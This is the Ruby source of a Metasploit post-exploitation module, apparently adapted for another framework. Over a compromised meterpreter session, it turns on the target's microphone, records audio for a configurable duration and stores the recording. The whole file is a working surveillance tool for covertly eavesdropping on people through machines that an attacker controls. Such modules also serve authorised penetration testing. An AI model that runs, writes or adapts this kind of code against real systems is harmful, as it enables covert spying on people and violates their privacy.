##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
            update_info(
                    info,
                    'Name'         => 'Multi Manage Record Microphone',
                    'Description'  => %q{
          This module will enable and record your target's microphone.
          For non-Windows targets, please use Java meterpreter to be
          able to use this feature.
        },
                    'License'      => MSF_LICENSE,
                    'Author'       => ['sinn3r'],
                    'Platform'     => %w{linux osx win},
                    'SessionTypes' => ['meterpreter'],
                    'Compat'       => {
                            'Meterpreter' => {
                                    'Commands' => %w[
              stdapi_webcam_*
            ]
                            }
                    }
            )
    )

    register_options(
            [
                    OptInt.new('DURATION', [false, 'Number of seconds to record', 5])
            ]
    )
  end

  def run
    data      = nil
    data      = client.webcam.record_mic(datastore['DURATION'])
    filename  = "#{Time.now.strftime("%Y%m%d%H%M%S")}_audio.wav"
    full_path = store_viper(data, filename)
    pub_json_result(true,
                    nil,
                    filename,
                    self.uuid)
  end
end
